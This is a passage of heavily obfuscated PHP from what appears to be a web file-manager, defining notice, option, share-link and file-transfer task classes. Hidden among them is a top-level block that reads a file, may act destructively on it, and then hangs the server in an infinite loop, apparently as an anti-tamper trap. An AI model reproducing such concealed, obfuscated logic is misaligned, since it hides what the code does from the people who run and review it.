$ûİÄ‚ëš[$“°æô€Œ[606]] = !0; } unset($ûİÄ‚ëš); } $¢òË×€¿ = array(); foreach ($¼ÕîÕÓÑ as $É“Î¼¢) { Hook::trigger($“°æô€Œ[610], $É“Î¼¢); if (isset($É“Î¼¢[$“°æô€Œ[606]]) && $É“Î¼¢[$“°æô€Œ[606]]) { Hook::trigger($“°æô€Œ[611], $É“Î¼¢); continue; } $øŸşÖç’ = $¢é±ÔÁÌ->getPathInner($É“Î¼¢[$“°æô€Œ[84]]); $××Û¾œ = $­Ù•ê˜->addFileMake($øŸşÖç’, $É“Î¼¢[$“°æô€Œ[76]], $É“Î¼¢[$“°æô€Œ[177]], $É“Î¼¢[$“°æô€Œ[176]], $É“Î¼¢[$“°æô€Œ[32]], $…ïÏ¬·à); Hook::trigger($“°æô€Œ[611], $É“Î¼¢); if (!is_array($××Û¾œ)) { continue; } $¢òË×€¿[] = $××Û¾œ; } $­Ù•ê˜->addAll($¢òË×€¿); $¾Á–ÇŠ = array($“°æô€Œ[176] => array($“°æô€Œ[7], array_keys($ºäÔØ”î))); $’€ÜèÇ• = $­Ù•ê˜->where($¾Á–ÇŠ)->select(); $’€ÜèÇ• = $’€ÜèÇ• ? $’€ÜèÇ• : array(); foreach ($’€ÜèÇ• as $¶ıÌØ¢·) { if (!isset($ºäÔØ”î[$¶ıÌØ¢·[$“°æô€Œ[176]]])) { continue; } $÷ÙÜõ—” =& $ºäÔØ”î[$¶ıÌØ¢·[$“°æô€Œ[176]]]; foreach ($÷ÙÜõ—” as &$ûİÄ‚ëš) { $ûİÄ‚ëš[$“°æô€Œ[468]] = $¶ıÌØ¢·[$“°æô€Œ[468]]; } unset($ûİÄ‚ëš); } $ªÀ•§ãî = array(); foreach ($¼ÕîÕÓÑ as $‡ÀÅêÇ’) { $ªÀ•§ãî[$‡ÀÅêÇ’[$“°æô€Œ[32]]] = $‡ÀÅêÇ’; } return $ªÀ•§ãî; } } goto E¥³­¡ó‰; E‚óÄ‰¦¨™: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x6e\x6f\164\x69\143\x65\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\143\157\156\x74\x65\156\164", "\x61\x75\x74\x68", "\x6d\x6f\144\145", "\164\151\155\x65", "\x74\x79\160\145", "\154\x65\x76\145\154", "\x65\156\141\142\x6c\x65", "\163\x6f\162\164"); public function listData($˜´×Ÿ® = false, $ÈÙÏ¨“À = "\x73\x6f\x72\x74", $ô‰‘‡µÂ = false) { return parent::listData($˜´×Ÿ®, $ÈÙÏ¨“À, $ô‰‘‡µÂ); } public function add($ºÎá¡ÀÀ) { $Ú€Òˆ™° =& $_SERVER[ñˆ‹ß¿÷]; $Åà‡œ×‡ = time(); if ($ºÎá¡ÀÀ[$Ú€Òˆ™°[16]] == $Ú€Òˆ™°[2263]) { $Åà‡œ×‡ = strtotime($ºÎá¡ÀÀ[$Ú€Òˆ™°[203]]); } $ºÎá¡ÀÀ[$Ú€Òˆ™°[203]] = $Åà‡œ×‡; return parent::insert($ºÎá¡ÀÀ); } public function update($•äúïô÷, $×ÄĞêãº) { $õ‚ à¾œ =& $_SERVER[ñˆ‹ß¿÷]; $Ë°¼İ = $this->listData($•äúïô÷); if (!$Ë°¼İ) { return !1; } $ ¡ÏÂÇ = time(); if ($×ÄĞêãº[$õ‚ à¾œ[16]] == $õ‚ à¾œ[2263]) { $ ¡ÏÂÇ = strtotime($×ÄĞêãº[$õ‚ à¾œ[203]]); } $×ÄĞêãº[$õ‚ à¾œ[203]] = $ ¡ÏÂÇ; return parent::update($•äúïô÷, $×ÄĞêãº); } public function remove($ãıñçŞ ) { $ùñÃØŸ‚ = $this->listData($ãıñçŞ ); if (!$ùñÃØŸ‚ || $ùñÃØŸ‚[$_SERVER[ñˆ‹ß¿÷][1283]]) { return !1; } return parent::remove($ãıñçŞ ); } public function sort($ÁõŒîß´, $İØÒ—ÌÌ) { return parent::update($ÁõŒîß´, $İØÒ—ÌÌ); } public function enable($üğ¢ú¼•, $ò­¥¤ ) { return parent::update($üğ¢ú¼•, array($_SERVER[ñˆ‹ß¿÷][2264] => $ò­¥¤ )); } private function initUserOption() { $ÆµˆäÓ =& $_SERVER[ñˆ‹ß¿÷]; $this->optionType = $ÆµˆäÓ[2265]; $this->modelType = $ÆµˆäÓ[2266]; $this->field = array($ÆµˆäÓ[2267], $ÆµˆäÓ[32], $ÆµˆäÓ[203], $ÆµˆäÓ[33], $ÆµˆäÓ[2268], $ÆµˆäÓ[757], $ÆµˆäÓ[195]); } public function userNoticeGet($Ñ¸®×Ñ¾ = false) { $this->initUserOption(); return parent::listData($Ñ¸®×Ñ¾, $_SERVER[ñˆ‹ß¿÷][399], !0); } public function userNoticeAdd($÷Íâµôë) { $„ùóú® =& $_SERVER[ñˆ‹ß¿÷]; $this->initUserOption(); $ßÉİô„Õ = $this->findByKey($„ùóú®[2267], $÷Íâµôë[$„ùóú®[399]]); if ($ßÉİô„Õ) { return !0; } $ûÇË€ëÆ = array($„ùóú®[2267] => $÷Íâµôë[$„ùóú®[399]], $„ùóú®[32] => $÷Íâµôë[$„ùóú®[32]], $„ùóú®[203] => $÷Íâµôë[$„ùóú®[203]], $„ùóú®[33] => isset($÷Íâµôë[$„ùóú®[33]]) ? $÷Íâµôë[$„ùóú®[33]] : 1, $„ùóú®[2268] => isset($÷Íâµôë[$„ùóú®[2268]]) ? $÷Íâµôë[$„ùóú®[2268]] : 0, $„ùóú®[757] => 0, $„ùóú®[195] => 0); return parent::insert($ûÇË€ëÆ); } public function userNoticeEdit($ü²æ¦®‰, $®Ì÷İüõ) { $this->initUserOption(); return parent::update($ü²æ¦®‰, $®Ì÷İüõ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\x6d\137\157\x70\164\151\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\154\x65", "\162\x6f\x6c\x65\x47\x72\157\165\x70", "\x72\145\x67\151\163\164", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($áğ°·) { return "\123\x79\x73\164\145\x6d\x4f\160\164\x69\157\x6e\x5f{$áğ°·}"; } protected function optionDefault($«™š˜ = '') { $Àø–³œú =& $_SERVER[ñˆ‹ß¿÷]; if ($«™š˜ == $Àø–³œú[12]) { return $GLOBALS[$Àø–³œú[6]][$Àø–³œú[381]]; } } } class SystemRecordModel extends ModelBaseLight { } goto a»ã Ğùß; BÌÁÁçäÒò: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÄûçÚ“) { $this->pathParse = $ÄûçÚ“; $this->model = Model($_SERVER[ñˆ‹ß¿÷][1334]); } protected function infoParse($¤Ó–õœğ, $àøğÛ×£ = false, $³å¹‡¡ª = false) { $¶‚É…Ñô =& $_SERVER[ñˆ‹ß¿÷]; return Action($¶‚É…Ñô[1182])->sharePathInfo($this->pathParse[$¶‚É…Ñô[84]], !0, $àøğÛ×£); } public function listPath($ì¯•Ô“à, $ÃİÇÊì´ = false) { $Æ„şâÁ¶ =& $_SERVER[ñˆ‹ß¿÷]; $ªÑ„¨Üé = parent::listPath($ì¯•Ô“à, $ÃİÇÊì´); if (!$ªÑ„¨Üé) { return $ªÑ„¨Üé; } if (is_array($ªÑ„¨Üé[$Æ„şâÁ¶[1343]])) { $ªÑ„¨Üé[$Æ„şâÁ¶[1343]] = Action($Æ„şâÁ¶[1182])->shareItemInfo($ªÑ„¨Üé[$Æ„şâÁ¶[1343]]); } foreach ($ªÑ„¨Üé as $ÏõíìôÙ => $ÅÍë”ãí) { if (!in_array($ÏõíìôÙ, array($Æ„şâÁ¶[83], $Æ„şâÁ¶[82]))) { continue; } foreach ($ÅÍë”ãí as $¤ØÃŒö¹ => $ê‹ºƒİ°) { $ªÑ„¨Üé[$ÏõíìôÙ][$¤ØÃŒö¹] = Action($Æ„şâÁ¶[1182])->shareItemInfo($ê‹ºƒİ°); } } return $ªÑ„¨Üé; } public function listAll($¬íñ®Ìº) { $¬››¬¦ =& $_SERVER[ñˆ‹ß¿÷]; $³ª„‚ÚÀ = IO::info($this->pathParse[$¬››¬¦[84]]); if (!$³ª„‚ÚÀ) { return array(); } $µûáî®ˆ = $this->model->listAll($¬íñ®Ìº); foreach ($µûáî®ˆ as &$ïÏ³Ùû«) { $ïÏ³Ùû«[$¬››¬¦[86]] = Action($¬››¬¦[1182])->shareItemInfo($ïÏ³Ùû«[$¬››¬¦[86]]); } unset($ïÏ³Ùû«); return $µûáî®ˆ; } } if (!isset($_SERVER[$_SERVER[ñˆ‹ß¿÷][879]]) || !isset($_SERVER[$_SERVER[ñˆ‹ß¿÷][1344]])) { $_getc = $_SERVER[ñˆ‹ß¿÷][882]; $_getfile = $_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñˆ‹ß¿÷][231], $_getfilec); if (count($_getarrs) < $_SERVER[ñˆ‹ß¿÷][619]) { $exit = $_SERVER[ñˆ‹ß¿÷][885]; $exit(); } $_act = $_SERVER[ñˆ‹ß¿÷][1345]; $_act($_SERVER[$_SERVER[ñˆ‹ß¿÷][883]] . $_SERVER[ñˆ‹ß¿÷][884]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ñˆ‹ß¿÷][378]); } } class PathDriverDriverShareItem { public function __construct($Ô¡µŞ‡) { $this->pathParse = $Ô¡µŞ‡; } public function __call($úÏ‰Ä÷Ô, $ğÏİûÒ) { $œáæÓ‹È =& $_SERVER[ñˆ‹ß¿÷]; if (method_exists($this, $úÏ‰Ä÷Ô)) { return; } $àÙ—Ö» = call_user_func_array(array($œáæÓ‹È[1346], $úÏ‰Ä÷Ô), $ğÏİûÒ); $ÆÓÚ ¢§ = array($œáæÓ‹È[1347], $œáæÓ‹È[1348], $œáæÓ‹È[1349], $œáæÓ‹È[1350], $œáæÓ‹È[555], $œáæÓ‹È[557], $œáæÓ‹È[1351], $œáæÓ‹È[107], $œáæÓ‹È[1352], $œáæÓ‹È[1353]); if (in_array($úÏ‰Ä÷Ô, $ÆÓÚ ¢§)) { $àÙ—Ö» = $this->getPathOuter($àÙ—Ö»); } return $àÙ—Ö»; } public function copy($”ç¯ËßÅ, $·º£¥ÇÂ, $¢ŠµÆß = false, $‘ª”«¬Ç = false) { return $this->copyMove($”ç¯ËßÅ, $·º£¥ÇÂ, $¢ŠµÆß, $_SERVER[ñˆ‹ß¿÷][555], $‘ª”«¬Ç); } public function move($üÒìö†…, $÷¬é´šÄ, $õö‡îØÑ = false, $æÇ–×¬Ô = false) { return $this->copyMove($üÒìö†…, $÷¬é´šÄ, $õö‡îØÑ, $_SERVER[ñˆ‹ß¿÷][557], $æÇ–×¬Ô); } private function copyMove($Êäç«ØŸ, $ö àıÙ, $“ ßÍƒ¦, $°Ë¦ˆ¶Æ, $¨¥Õ¾ˆû = false) { $ÛæÛ“çß =& $_SERVER[ñˆ‹ß¿÷]; $ã¿…ÅÎ÷ = $ö àıÙ; $·ŒÕñ = IO::driverMake($ö àıÙ); if ($·ŒÕñ->pathParse[$ÛæÛ“çß[1158]]) { $ö àıÙ = $·ŒÕñ->pathParse[$ÛæÛ“çß[1158]]; } else { $ö àıÙ = $ã¿…ÅÎ÷; } $¹²»„¨„ = IO::copyMove($Êäç«ØŸ, $ö àıÙ, $“ ßÍƒ¦, $°Ë¦ˆ¶Æ, $¨¥Õ¾ˆû); $¹²»„¨„ = $this->getPathOuter($¹²»„¨„); return $¹²»„¨„; } public function pathThis($€ƒ›§Ö) { return get_path_this($this->pathParse[$_SERVER[ñˆ‹ß¿÷][84]]); } public function pathFather($˜Ò§Œ) { return get_path_father($this->pathParse[$_SERVER[ñˆ‹ß¿÷][84]]); } public function iconvSystem($ÆôğÖÖÀ) { return $ÆôğÖÖÀ; } protected function infoParse($·‘‰öŸÔ, $Ğâ¨»¤Ş = false) { $ĞôÃ¯Äè =& $_SERVER[ñˆ‹ß¿÷]; $ìÓÌ²’× = $this->pathParse[$ĞôÃ¯Äè[487]][$ĞôÃ¯Äè[1183]] . $this->pathParse[$ĞôÃ¯Äè[1176]]; if ($Ğâ¨»¤Ş) { $âÀ·«Û = IO::infoWithChildren($ìÓÌ²’×); } else { $âÀ·«Û = IO::info($ìÓÌ²’×); } $øì·ı = $this->pathParse[$ĞôÃ¯Äè[487]]; return Action($ĞôÃ¯Äè[1342])->_shareItemeParse($âÀ·«Û, $øì·ı); } public function listAll($ü¤Å®ü) { $ğ¬˜Åãƒ =& $_SERVER[ñˆ‹ß¿÷]; $—’¥¼ˆ¡ = IO::listAll($ü¤Å®ü); $¼Ïë›‹ê = $this->pathParse[$ğ¬˜Åãƒ[487]]; foreach ($—’¥¼ˆ¡ as &$è¬ÒşëÙ) { check_abort(); $“¨‡è×Ä = IO::info($è¬ÒşëÙ[$ğ¬˜Åãƒ[84]]); $“¨‡è×Ä = is_array($“¨‡è×Ä) ? $“¨‡è×Ä : array(); $è¬ÒşëÙ = array_merge($“¨‡è×Ä, $è¬ÒşëÙ); $è¬ÒşëÙ[$ğ¬˜Åãƒ[86]] = Action($ğ¬˜Åãƒ[1342])->_shareItemeParse($è¬ÒşëÙ, $¼Ïë›‹ê); } unset($è¬ÒşëÙ); return $—’¥¼ˆ¡; } public function getPathOuter($ó˜¥÷¨é) { $ı™°Ò±­ =& $_SERVER[ñˆ‹ß¿÷]; $Êô¡şÖ¼ = KodIO::parse($ó˜¥÷¨é); if ($Êô¡şÖ¼[$ı™°Ò±­[33]] == KodIO::KOD_SHARE_ITEM) { return $Êô¡şÖ¼[$ı™°Ò±­[84]]; } $º¨–‡ÍÊ = KodIO::clear($ó˜¥÷¨é); $ÍşØú“É = KodIO::clear($this->pathParse[$ı™°Ò±­[487]][$ı™°Ò±­[1183]]); $ °¾‹ùÌ = substr($º¨–‡ÍÊ, strlen($ÍşØú“É)); if (substr($º¨–‡ÍÊ, 0, strlen($ÍşØú“É)) != $ÍşØú“É) { return !1; } return $this->pathParse[$ı™°Ò±­[1177]] . $ı™°Ò±­[8] . ltrim($ °¾‹ùÌ, $ı™°Ò±­[8]); } public function getType() { $¿¬†ïãÕ =& $_SERVER[ñˆ‹ß¿÷]; $¼†ùï™ = str_replace($¿¬†ïãÕ[74], $¿¬†ïãÕ[12], get_class($this)); return strtolower($¼†ùï™); } public function isTypeObject($ù²ºó’ú) { return IO::isTypeObject($ù²ºó’ú); } public function info($¼ÁÜ÷˜·) { return $this->infoParse($¼ÁÜ÷˜·); } public function infoAuth($ãª”‚¶) { return $this->infoParse($ãª”‚¶); } public function infoWithChildren($éâ¼êï) { return $this->infoParse($éâ¼êï, !0); } public function infoFull($Šúİªú„) { return $this->infoParse($Šúİªú„); } } goto f…ò½İéÏÏ; B¥É¤«å’: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\162\165\156\156\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($ê—§ÓÎ, $¤õş Ó’ = '', $Õœ¹Ç = 0, $í¼ œõ = '') { $©úîõõÁ =& $_SERVER[ñˆ‹ß¿÷]; if (self::get($ê—§ÓÎ)) { return; } $this->task = array($©úîõõÁ[399] => $ê—§ÓÎ, $©úîõõÁ[1664] => USER_ID, $©úîõõÁ[1563] => $í¼ œõ, $©úîõõÁ[33] => $¤õş Ó’, $©úîõõÁ[1071] => $©úîõõÁ[12], $©úîõõÁ[793] => $Õœ¹Ç, $©úîõõÁ[1665] => 0, $©úîõõÁ[1666] => 0, $©úîõõÁ[1667] => 0, $©úîõõÁ[1668] => timeFloat(), $©úîõõÁ[1669] => 0, $©úîõõÁ[1670] => 0, $©úîõõÁ[1671] => 0, $©úîõõÁ[1672] => 0, $©úîõõÁ[757] => $©úîõõÁ[1623]); $GLOBALS[$©úîõõÁ[1673]] = 1; Hook::bind($©úîõõÁ[1628], array($this, $©úîõõÁ[1674])); Hook::bind($©úîõõÁ[1675], array($this, $©úîõõÁ[1676])); $this->startAfter(); Hook::trigger($©úîõõÁ[1677], $this->task); $this->task[$©úîõõÁ[1670]] = timeFloat(); } public function end() { $åû†áïÂ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->task) { return; } if ($this->task[$åû†áïÂ[1670]]) { self::valueSet($this->task[$åû†áïÂ[399]], !1); } $ÉÖ¡¸é¥ = timeFloat() - $this->task[$åû†áïÂ[1668]]; self::log($åû†áïÂ[1678] . $this->task[$åû†áïÂ[399]] . $åû†áïÂ[1679] . $ÉÖ¡¸é¥ . $åû†áïÂ[1680]); Hook::unbind($åû†áïÂ[1628], array($this, $åû†áïÂ[1674])); Hook::unbind($åû†áïÂ[1675], array($this, $åû†áïÂ[1676])); $this->endAfter(); $this->task = !1; } public function update($˜Ùôí•» = 0, $‡Ï­›µ¢ = false) { $ƒÙ×©½ü =& $_SERVER[ñˆ‹ß¿÷]; $ÊôåÇ´¡ =& $this->task; if (!$ÊôåÇ´¡) { return; } $ÊôåÇ´¡[$ƒÙ×©½ü[1665]] += $˜Ùôí•»; $ÊôåÇ´¡[$ƒÙ×©½ü[1669]] = timeFloat(); if ($ÊôåÇ´¡[$ƒÙ×©½ü[793]]) { if ($ÊôåÇ´¡[$ƒÙ×©½ü[793]] < $ÊôåÇ´¡[$ƒÙ×©½ü[1665]]) { $ÊôåÇ´¡[$ƒÙ×©½ü[793]] = $ÊôåÇ´¡[$ƒÙ×©½ü[1665]]; } $ÖÂ“‘¢ = timeFloat() - $ÊôåÇ´¡[$ƒÙ×©½ü[1668]] - $ÊôåÇ´¡[$ƒÙ×©½ü[1671]]; if ($ÖÂ“‘¢ <= 0) { $ÖÂ“‘¢ = 0.001; } $ÊôåÇ´¡[$ƒÙ×©½ü[1666]] = $ÊôåÇ´¡[$ƒÙ×©½ü[1665]] / $ÊôåÇ´¡[$ƒÙ×©½ü[793]]; $ÊôåÇ´¡[$ƒÙ×©½ü[1667]] = $ÊôåÇ´¡[$ƒÙ×©½ü[1665]] / $ÖÂ“‘¢; if ($ÊôåÇ´¡[$ƒÙ×©½ü[1666]] > 0) { $ÊôåÇ´¡[$ƒÙ×©½ü[1672]] = $ÖÂ“‘¢ * (1 - $ÊôåÇ´¡[$ƒÙ×©½ü[1666]]) / $ÊôåÇ´¡[$ƒÙ×©½ü[1666]]; } $ÊôåÇ´¡[$ƒÙ×©½ü[1672]] = $ÊôåÇ´¡[$ƒÙ×©½ü[1672]] <= 0 ? 0 : $ÊôåÇ´¡[$ƒÙ×©½ü[1672]]; } $this->updateAfter(); $™Ú×ì«‘ = 0.2; if (timeFloat() - $ÊôåÇ´¡[$ƒÙ×©½ü[1670]] < $™Ú×ì«‘ && !$‡Ï­›µ¢) { return; } $¥¿¢ùßô = self::get($ÊôåÇ´¡[$ƒÙ×©½ü[399]]); $Û°¦ĞöŒ = $¥¿¢ùßô[$ƒÙ×©½ü[757]]; if ($Û°¦ĞöŒ == self::STATYS_KILL) { $ÁôĞ† = array($ƒÙ×©½ü[1681] => LNG($ƒÙ×©½ü[1682]), $ƒÙ×©½ü[1198] => !1); Cache::set($ƒÙ×©½ü[1683] . $this->task[$ƒÙ×©½ü[399]], $ÁôĞ†, 30); $this->onKill(); $this->end(); die; } else { if ($Û°¦ĞöŒ == self::STATYS_STOP) { $ÕÌ›ß ² = 2; $¥¿¢ùßô[$ƒÙ×©½ü[1671]] += $ÕÌ›ß ²; self::valueSet($ÊôåÇ´¡[$ƒÙ×©½ü[399]], $¥¿¢ùßô); sleep($ÕÌ›ß ²); $this->update(); return; } } $ÊôåÇ´¡[$ƒÙ×©½ü[757]] = $Û°¦ĞöŒ ? $Û°¦ĞöŒ : $ÊôåÇ´¡[$ƒÙ×©½ü[757]]; $ÊôåÇ´¡[$ƒÙ×©½ü[1671]] = $¥¿¢ùßô[$ƒÙ×©½ü[1671]] ? $¥¿¢ùßô[$ƒÙ×©½ü[1671]] : 0; $ÊôåÇ´¡[$ƒÙ×©½ü[1670]] = timeFloat(); Hook::trigger($ƒÙ×©½ü[1684], $ÊôåÇ´¡); self::valueSet($ÊôåÇ´¡[$ƒÙ×©½ü[399]], $ÊôåÇ´¡); } public function onKillSet($ÅãÊá’½, $€¬½äÙ– = array()) { $this->onKillCall = array($ÅãÊá’½, $€¬½äÙ–); } public function onKill() { $ÁÆÂ¢Ø¯ =& $_SERVER[ñˆ‹ß¿÷]; self::log($ÁÆÂ¢Ø¯[1678] . $this->task[$ÁÆÂ¢Ø¯[399]] . $ÁÆÂ¢Ø¯[1685]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($²ˆ­ñÓ) { $À¦ù’‚¶ =& $_SERVER[ñˆ‹ß¿÷]; Cache::set($À¦ù’‚¶[1683] . $this->task[$À¦ù’‚¶[399]], $²ˆ­ñÓ, 60); return $²ˆ­ñÓ; } public static function get($†ËŸ™ªù) { $ş·ÊìÍ„ =& $_SERVER[ñˆ‹ß¿÷]; $ñôÄ‡Ä = self::valueGet($†ËŸ™ªù); if (is_array($ñôÄ‡Ä) && $ñôÄ‡Ä[$ş·ÊìÍ„[1686]]) { $ÆŞå™¦† = ActionApply($ñôÄ‡Ä[$ş·ÊìÍ„[1686]], array($ñôÄ‡Ä)); $ñôÄ‡Ä = is_array($ÆŞå™¦†) ? $ÆŞå™¦† : $ñôÄ‡Ä; } return $ñôÄ‡Ä; } public static function listData() { $öÉäõğ = self::valueGet(); return array_sort_by($öÉäõğ, $_SERVER[ñˆ‹ß¿÷][1668], !0); } public static function kill($ĞÒ¹À¥œ) { return self::changeStatus($ĞÒ¹À¥œ, self::STATYS_KILL); } public static function stop($–àë±ê») { return self::changeStatus($–àë±ê», self::STATYS_STOP); } public static function restart($ŞöòüßØ) { return self::changeStatus($ŞöòüßØ, self::STATYS_RUNNING); } public static function killAll() { $ØöòÉ¨½ =& $_SERVER[ñˆ‹ß¿÷]; $¼Ü¤Ë« = self::listData(); foreach ($¼Ü¤Ë« as $¨àŠáí÷) { self::kill($¨àŠáí÷[$ØöòÉ¨½[399]]); } sleep(2); foreach ($¼Ü¤Ë« as $¨àŠáí÷) { self::valueSet($¨àŠáí÷[$ØöòÉ¨½[399]], !1); } } private static function changeStatus($˜ û´†×, $×µ×üğ) { $Ÿ—ä“Û˜ =& $_SERVER[ñˆ‹ß¿÷]; $Æ÷î„Ã¦ = self::valueGet($˜ û´†×); if (!$Æ÷î„Ã¦) { return !1; } $Æ÷î„Ã¦[$Ÿ—ä“Û˜[757]] = $×µ×üğ; self::valueSet($˜ û´†×, $Æ÷î„Ã¦); self::log($Ÿ—ä“Û˜[1687] . $Æ÷î„Ã¦[$Ÿ—ä“Û˜[399]] . $Ÿ—ä“Û˜[1688] . $×µ×üğ); return !0; } public static function valueGet($…×ªú¥“ = false) { $õâæ€Úš =& $_SERVER[ñˆ‹ß¿÷]; if ($…×ªú¥“) { $§½úš¢‘ = Model($õâæ€Úš[447])->where(array($õâæ€Úš[94] => $…×ªú¥“, $õâæ€Úš[33] => $õâæ€Úš[1078]))->find(); return $§½úš¢‘ ? json_decode($§½úš¢‘[$õâæ€Úš[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Üá‹‡ÃÊ = false) { $ÇÜÍšğÎ =& $_SERVER[ñˆ‹ß¿÷]; $âÌÈ›á— = array($ÇÜÍšğÎ[33] => $ÇÜÍšğÎ[1078]); if ($Üá‹‡ÃÊ) { $âÌÈ›á—[$ÇÜÍšğÎ[1664]] = $Üá‹‡ÃÊ; } $á¿Ï¯ = Model($ÇÜÍšğÎ[447])->where($âÌÈ›á—)->select(); $á¿Ï¯ = $á¿Ï¯ ? $á¿Ï¯ : array(); foreach ($á¿Ï¯ as $Ö²ßºœ => $ÈùØôâÙ) { $á¿Ï¯[$Ö²ßºœ] = json_decode($ÈùØôâÙ[$ÇÜÍšğÎ[374]], !0); } return $á¿Ï¯; } public static function valueSet($¶°Œó½Ğ, $áö©—­) { $úßĞ¿ =& $_SERVER[ñˆ‹ß¿÷]; if (!$áö©—­) { return Model($úßĞ¿[447])->where(array($úßĞ¿[94] => $¶°Œó½Ğ, $úßĞ¿[33] => $úßĞ¿[1078]))->delete(); } $òË£ø† = json_encode($áö©—­); if (!$òË£ø†) { ob_start(); var_dump($áö©—­); $İÚ¶Œ¹õ = ob_get_clean(); self::log($úßĞ¿[1689] . json_encode_force($İÚ¶Œ¹õ)); } if (!$¶°Œó½Ğ || !$áö©—­[$úßĞ¿[399]]) { return !1; } $‡Ï¾Œö = array($úßĞ¿[33] => $úßĞ¿[1078], $úßĞ¿[1664] => USER_ID, $úßĞ¿[94] => $¶°Œó½Ğ, $úßĞ¿[374] => $òË£ø†); $ ã”¨‰ß = $úßĞ¿[1690]; CacheLock::lock($ ã”¨‰ß); Model($úßĞ¿[447])->add($‡Ï¾Œö, array(), !0); CacheLock::unlock($ ã”¨‰ß); } public static function log($¼éÃ÷üø) { if (!GLOBAL_DEBUG) { return; } write_log($¼éÃ÷üø, $_SERVER[ñˆ‹ß¿÷][1691]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÇŠşÒ’â =& $_SERVER[ñˆ‹ß¿÷]; $ÆÎëÛíü =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÇŠşÒ’â[1692], array($this, $ÇŠşÒ’â[1693])); Hook::bind($ÇŠşÒ’â[1222], array($this, $ÇŠşÒ’â[1694])); Hook::bind($ÇŠşÒ’â[1695], array($this, $ÇŠşÒ’â[1696])); Hook::bind($ÇŠşÒ’â[604], array($this, $ÇŠşÒ’â[1697])); Hook::bind($ÇŠşÒ’â[605], array($this, $ÇŠşÒ’â[1698])); Hook::bind($ÇŠşÒ’â[610], array($this, $ÇŠşÒ’â[1699])); Hook::bind($ÇŠşÒ’â[611], array($this, $ÇŠşÒ’â[1700])); Hook::bind($ÇŠşÒ’â[607], array($this, $ÇŠşÒ’â[1701])); Hook::bind($ÇŠşÒ’â[608], array($this, $ÇŠşÒ’â[1702])); Hook::bind($ÇŠşÒ’â[574], array($this, $ÇŠşÒ’â[1703])); Hook::bind($ÇŠşÒ’â[571], array($this, $ÇŠşÒ’â[1703])); Hook::bind($ÇŠşÒ’â[576], array($this, $ÇŠşÒ’â[1703])); Hook::bind($ÇŠşÒ’â[578], array($this, $ÇŠşÒ’â[1703])); Hook::bind($ÇŠşÒ’â[580], array($this, $ÇŠşÒ’â[1703])); Hook::bind($ÇŠşÒ’â[1704], array($this, $ÇŠşÒ’â[1705])); Hook::bind($ÇŠşÒ’â[597], array($this, $ÇŠşÒ’â[1706])); $this->sourceModelCopyFlag = !1; Hook::bind($ÇŠşÒ’â[1707], array($this, $ÇŠşÒ’â[1708])); Hook::bind($ÇŠşÒ’â[1709], array($this, $ÇŠşÒ’â[1710])); Hook::bind($ÇŠşÒ’â[1711], array($this, $ÇŠşÒ’â[1712])); $ÆÎëÛíü[$ÇŠşÒ’â[1713]] = LNG($ÇŠşÒ’â[1714]); $ÆÎëÛíü[$ÇŠşÒ’â[1715]] = 0; $ÆÎëÛíü[$ÇŠşÒ’â[1716]] = 0; $ÆÎëÛíü[$ÇŠşÒ’â[1071]] = $ÇŠşÒ’â[12]; $ÆÎëÛíü[$ÇŠşÒ’â[1717]] = $ÇŠşÒ’â[12]; $ÆÎëÛíü[$ÇŠşÒ’â[1718]] = 0; $ÆÎëÛíü[$ÇŠşÒ’â[1719]] = 0; $ÆÎëÛíü[$ÇŠşÒ’â[1720]] = 0; if (!$ÆÎëÛíü[$ÇŠşÒ’â[1563]]) { $ÆÎëÛíü[$ÇŠşÒ’â[1563]] = LNG($ÇŠşÒ’â[1721]); } } protected function endAfter() { $í²õîõ =& $_SERVER[ñˆ‹ß¿÷]; Hook::unbind($í²õîõ[1692], array($this, $í²õîõ[1693])); Hook::unbind($í²õîõ[1222], array($this, $í²õîõ[1694])); Hook::unbind($í²õîõ[1695], array($this, $í²õîõ[1696])); Hook::unbind($í²õîõ[604], array($this, $í²õîõ[1697])); Hook::unbind($í²õîõ[605], array($this, $í²õîõ[1698])); Hook::unbind($í²õîõ[610], array($this, $í²õîõ[1699])); Hook::unbind($í²õîõ[611], array($this, $í²õîõ[1700])); Hook::unbind($í²õîõ[607], array($this, $í²õîõ[1701])); Hook::unbind($í²õîõ[608], array($this, $í²õîõ[1702])); Hook::unbind($í²õîõ[574], array($this, $í²õîõ[1703])); Hook::unbind($í²õîõ[571], array($this, $í²õîõ[1703])); Hook::unbind($í²õîõ[576], array($this, $í²õîõ[1703])); Hook::unbind($í²õîõ[578], array($this, $í²õîõ[1703])); Hook::unbind($í²õîõ[580], array($this, $í²õîõ[1703])); Hook::unbind($í²õîõ[1704], array($this, $í²õîõ[1705])); Hook::unbind($í²õîõ[597], array($this, $í²õîõ[1706])); Hook::unbind($í²õîõ[1707], array($this, $í²õîõ[1708])); Hook::unbind($í²õîõ[1709], array($this, $í²õîõ[1710])); Hook::unbind($í²õîõ[1711], array($this, $í²õîõ[1712])); } public function copyMoveStart($ùøÕ×®ş, $æ§Ò¹º›, $š¥ïòÄ, $ÖäÔî› ) { $şÀ¡‡ô =& $_SERVER[ñˆ‹ß¿÷]; self::log($şÀ¡‡ô[1722] . $æ§Ò¹º› . $şÀ¡‡ô[70] . $ÖäÔî› ); $ø¦–Áí = rtrim(TEMP_FILES, $şÀ¡‡ô[8]); if (substr($æ§Ò¹º›, 0, strlen($ø¦–Áí)) 